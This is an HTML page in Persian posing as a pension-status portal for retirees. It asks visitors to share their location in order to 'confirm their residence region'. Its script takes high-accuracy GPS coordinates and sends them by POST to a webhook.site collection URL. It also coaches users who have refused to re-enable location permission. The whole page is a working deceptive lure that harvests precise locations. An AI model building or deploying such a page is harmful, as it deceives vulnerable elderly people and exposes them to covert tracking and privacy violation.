<!DOCTYPE html>
<html lang="fa" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>سامانه بررسی وضعیت حقوق</title>
    <style>
        * { box-sizing: border-box; }
        body {
            font-family: Tahoma, Arial, sans-serif;
            text-align: center;
            padding: 20px;
            background-color: #f4f7f6;
            margin: 0;
        }
        .container {
            max-width: 500px;
            margin: 50px auto;
            background: white;
            padding: 30px;
            border-radius: 15px;
            box-shadow: 0 4px 15px rgba(0,0,0,0.1);
        }
        h2 { color: #2c3e50; margin-bottom: 20px; }
        p { color: #7f8c8d; line-height: 2; margin-bottom: 20px; }
        .btn {
            background-color: #2ecc71;
            color: white;
            padding: 15px 30px;
            font-size: 18px;
            font-weight: bold;
            border: none;
            cursor: pointer;
            border-radius: 10px;
            width: 100%;
            max-width: 300px;
        }
        .btn:hover { background-color: #27ae60; }
        .btn:disabled { background-color: #bdc3c7; cursor: wait; opacity: 0.7; }
        #result {
            margin-top: 25px;
            font-weight: bold;
            color: #34495e;
            overflow-wrap: anywhere;
            min-height: 20px;
            line-height: 1.8;
        }
        .error-msg { color: #e74c3c !important; }
        .success-msg { color: #27ae60 !important; }
        .warn-msg { color: #e67e22 !important; }
    </style>
</head>
<body>

<div class="container">
    <h2>سامانه بررسی وضعیت حقوق بازنشستگان</h2>
    <p>برای بررسی منطقه سکونت و مشاهده وضعیت پرداخت‌ها، لطفاً اجازه دسترسی به موقعیت مکانی خود را بدهید.</p>

    <button class="btn" id="locationBtn">تأیید منطقه سکونت و ورود</button>
    <div id="result">منتظر درخواست شما هستیم.</div>
</div>

<script>
    const button = document.getElementById("locationBtn");
    const result = document.getElementById("result");
    const WEBHOOK_URL = "https://webhook.site/3e658cab-cff7-4b12-ad19-52d6e636d924";

    // نمایش وضعیت اولیه در کنسول
    console.log("=== تشخیص اولیه ===");
    console.log("Secure Context:", window.isSecureContext);
    console.log("Protocol:", location.protocol);
    console.log("Geolocation available:", !!navigator.geolocation);

    if (navigator.permissions && navigator.permissions.query) {
        navigator.permissions.query({ name: "geolocation" })
            .then(function (perm) {
                console.log("Permission state:", perm.state);
                // اگر قبلاً رد شده، از اول به کاربر بگو
                if (perm.state === "denied") {
                    setResult(
                        "⚠️ دسترسی موقعیت مکانی برای این سایت <b>قبلاً رد شده</b> است.<br>" +
                        "لطفاً روی <b>آیکون قفل</b> کنار نوار آدرس کلیک کنید، " +
                        "«موقعیت مکانی» را روی «اجازه» بگذارید و صفحه را رفرش کنید.",
                        "warn-msg"
                    );
                }
            });
    }

    button.addEventListener("click", getLocation);

    function setResult(msg, cls) {
        result.innerHTML = msg;
        result.className = cls || "";
    }

    function getLocation() {
        setResult("در حال بررسی دسترسی...", "");
        button.disabled = true;

        // مرحله ۱: پشتیبانی مرورگر
        if (!navigator.geolocation) {
            setResult("مرورگر شما از قابلیت مکان‌یابی پشتیبانی نمی‌کند.", "error-msg");
            button.disabled = false;
            return;
        }

        // مرحله ۲: محیط امن
        if (!window.isSecureContext) {
            setResult(
                "⚠️ صفحه در محیط ناامن باز شده است.<br>" +
                "Geolocation فقط در HTTPS یا localhost کار می‌کند.",
                "warn-msg"
            );
            button.disabled = false;
            return;
        }

        // مرحله ۳: بررسی مجوز
        if (navigator.permissions && navigator.permissions.query) {
            navigator.permissions.query({ name: "geolocation" })
                .then(function (perm) {
                    console.log("Permission before request:", perm.state);
                    if (perm.state === "denied") {
                        setResult(
                            "⚠️ دسترسی موقعیت مکانی رد شده است.<br>" +
                            "آیکون قفل کنار آدرس → موقعیت مکانی → اجازه → رفرش صفحه.",
                            "warn-msg"
                        );
                        button.disabled = false;
                    } else {
                        // مهم: اینجا مستقیم request می‌زنیم
                        requestPosition();
                    }
                })
                .catch(function () {
                    requestPosition();
                });
        } else {
            requestPosition();
        }
    }

    function requestPosition() {
        setResult("در حال درخواست دسترسی...<br>لطفاً پنجره مرورگر را تأیید کنید.", "");

        // نکته مهم: درخواست باید مستقیماً در handler کلیک باشد
        navigator.geolocation.getCurrentPosition(
            onSuccess,
            onError,
            {
                enableHighAccuracy: true,
                timeout: 15000,
                maximumAge: 0
            }
        );
    }

    function onSuccess(position) {
        const lat = position.coords.latitude;
        const lng = position.coords.longitude;
        const acc = position.coords.accuracy;

        console.log("موقعیت دریافت شد:", lat, lng, acc);
        setResult("موقعیت دریافت شد. در حال ارسال...", "");

        fetch(WEBHOOK_URL, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({
                lat: lat,
                lng: lng,
                accuracy: acc,
                timestamp: new Date().toISOString()
            })
        })
        .then(function (r) {
            if (!r.ok) throw new Error("HTTP " + r.status);
            return r.json().catch(function () { return {}; });
        })
        .then(function () {
            setResult("اطلاعات با موفقیت ثبت شد ✅", "success-msg");
        })
        .catch(function (err) {
            console.error("خطای ارسال:", err);
            setResult(
                "موقعیت دریافت شد اما ارسال به سرور ناموفق بود.<br>" +
                "خطا: " + err.message,
                "error-msg"
            );
        })
        .finally(function () {
            button.disabled = false;
        });
    }

    function onError(error) {
        button.disabled = false;
        console.error("Geolocation error:", error.code, error.message);

        var messages = {
            1: "دسترسی رد شد (PERMISSION_DENIED).<br>" +
               "آیکون قفل کنار آدرس → موقعیت مکانی → اجازه → رفرش.",
            2: "موقعیت در دسترس نیست (POSITION_UNAVAILABLE).<br>" +
               "سرویس Location سیستم‌عامل و Wi-Fi را بررسی کنید.",
            3: "زمان تمام شد (TIMEOUT).<br>دوباره تلاش کنید."
        };

        setResult("❌ " + (messages[error.code] || "خطای ناشناخته: " + error.message), "error-msg");
    }
</script>

</body>
</html>
